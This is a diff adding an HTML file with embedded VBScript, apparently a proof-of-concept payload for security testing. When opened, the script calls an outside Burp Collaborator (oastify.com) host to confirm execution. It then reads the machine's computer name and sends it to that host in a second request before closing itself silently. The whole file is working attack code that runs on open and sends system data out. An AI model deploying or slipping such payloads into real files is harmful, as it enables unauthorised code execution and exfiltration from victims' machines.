@@ -1,0 +1,27 @@
+<html>
+<head>
+<script language="VBScript">
+    Dim http
+    Set http = CreateObject("Microsoft.XMLHTTP")
+    
+    ' Callback to your Burp Collaborator or local listener
+    http.open "GET", "http://v51c0zqb0kum30e8iy00awj1ssyjmja8.oastify.com/proof_of_execution", False
+    http.send
+    
+    ' Optional: Also try to exfiltrate system info
+    Dim wsh, computerName
+    Set wsh = CreateObject("WScript.Shell")
+    computerName = wsh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+    
+    Dim http2
+    Set http2 = CreateObject("Microsoft.XMLHTTP")
+    http2.open "GET", "http://v51c0zqb0kum30e8iy00awj1ssyjmja8.oastify.com/computer_" & computerName, False
+    http2.send
+    
+    Self.Close()
+</script>
+</head>
+<body>
+Proof of Execution
+</body>
+</html>
